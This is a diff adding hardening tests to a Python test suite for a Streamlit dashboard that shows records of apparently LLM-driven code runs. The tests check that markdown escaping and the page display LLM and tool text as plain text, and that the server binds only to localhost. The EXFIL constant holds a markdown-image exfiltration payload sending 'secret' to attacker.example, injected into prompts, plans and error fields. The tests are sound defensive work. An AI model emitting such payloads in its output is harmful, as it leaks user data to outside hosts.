@@ -1,6 +1,7 @@
 import asyncio
 import json
 import re
+import tomllib
 from pathlib import Path
 
 import pytest
@@ -11,7 +12,8 @@ from src.models.state import ProcessStatus, VerificationResult
 from src.process.engine import DecisionRequest, StartRequest
 from src.process.graph import TRANSITIONS, Step, Terminal
 from src.runtime import open_runner
-from tests.conftest import FIXED_CALC, StateFactory
+from src.storage.sqlite_store import SqliteStore
+from tests.conftest import FIXED_CALC, T0, StateFactory
 
 DASHBOARD = Path(dashboard.__file__)
 
@@ -140,3 +142,59 @@ def test_page_refuses_revise_without_comment(git_repo: Path, tmp_path: Path) -> 
 
     assert any("comment" in e.value for e in at.error)
     assert at.selectbox(key="run_id").value == "ui-2"
+
+
+# --- hardening -------------------------------------------------------------------------------------------
+
+EXFIL = "![x](http://attacker.example/leak?d=secret) [click](http://attacker.example)"
+UNESCAPED_LINK = re.compile(r"(?<!\\)!\[|(?<!\\)\]\(")
+
+
+def test_md_escape_neutralises_images_and_links() -> None:
+    escaped = dashboard.md_escape(EXFIL)
+    assert not UNESCAPED_LINK.search(escaped)
+    assert "attacker\\.example" in escaped  # still readable: escaped characters render as themselves
+
+
+async def test_page_never_renders_llm_or_tool_text_as_markdown(
+    tmp_path: Path, make_state: StateFactory
+) -> None:
+    db = tmp_path / "evil.db"
+    state = make_state(
+        run_id="evil-1",
+        user_prompt=f"task {EXFIL}",
+        status=ProcessStatus.FAILED,
+        current_step="end",
+        terminal_reason="commit_failed",
+        execution_plan=[f"step {EXFIL}"],
+        verification=VerificationResult(
+            pytest_passed=False, pytest_output="", linter_passed=True, linter_output="", error_summary=EXFIL
+        ),
+        error_message=f"git said {EXFIL}",
+    )
+    async with SqliteStore(db) as store:
+        await store.save_state(state, T0)
+
+    def render() -> AppTest:
+        at = AppTest.from_file(str(DASHBOARD), default_timeout=60)
+        at.run()
+        at.text_input(key="db_path").set_value(str(db)).run()
+        return at
+
+    at = await asyncio.to_thread(render)  # AppTest runs its own event loop
+    assert not at.exception
+    rendered = [
+        e.value
+        for kind in ("markdown", "caption", "error", "info", "warning", "success")
+        for e in getattr(at, kind)
+    ]
+    assert any("attacker\\.example" in r for r in rendered)  # the text is shown, as text
+    assert not any(UNESCAPED_LINK.search(r) for r in rendered), rendered
+
+
+def test_dashboard_only_listens_on_localhost() -> None:
+    config = tomllib.loads(
+        (DASHBOARD.parent.parent / ".streamlit" / "config.toml").read_text(encoding="utf-8")
+    )
+    assert config["server"]["address"] == "127.0.0.1"
+    assert config["browser"]["gatherUsageStats"] is False
